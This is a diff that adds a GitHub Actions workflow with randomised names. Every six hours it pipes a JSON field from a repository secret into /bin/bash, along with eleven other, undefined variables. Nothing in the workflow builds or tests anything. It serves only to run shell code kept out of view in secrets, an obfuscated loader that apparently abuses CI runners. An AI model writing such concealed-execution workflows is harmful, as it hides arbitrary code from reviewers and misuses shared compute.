@@ -1,0 +1,30 @@
+name: zhaotongluo7615
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '13 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: zhaotongluo7615
+        env:
+          vy072: ${{ secrets.vy072 }}
+        run: |
+          echo $vy072 | jq -r .o42 | /bin/bash
+          echo $pa7299 | jq -r .n7413 | /bin/bash
+          echo $rf747 | jq -r .jizyc4 | /bin/bash
+          echo $p22 | jq -r .s525 | /bin/bash
+          echo $py49245 | jq -r .kf2549 | /bin/bash
+          echo $ie9464 | jq -r .l9765 | /bin/bash
+          echo $xpvb70548 | jq -r .qhs010 | /bin/bash
+          echo $jcmp7 | jq -r .ajd5386 | /bin/bash
+          echo $evpk903 | jq -r .xizix6 | /bin/bash
+          echo $tqmss54771 | jq -r .wqdmm6813 | /bin/bash
+          echo $zvdr8638 | jq -r .c0703 | /bin/bash
+          echo $ovtic08 | jq -r .rl9 | /bin/bash
+
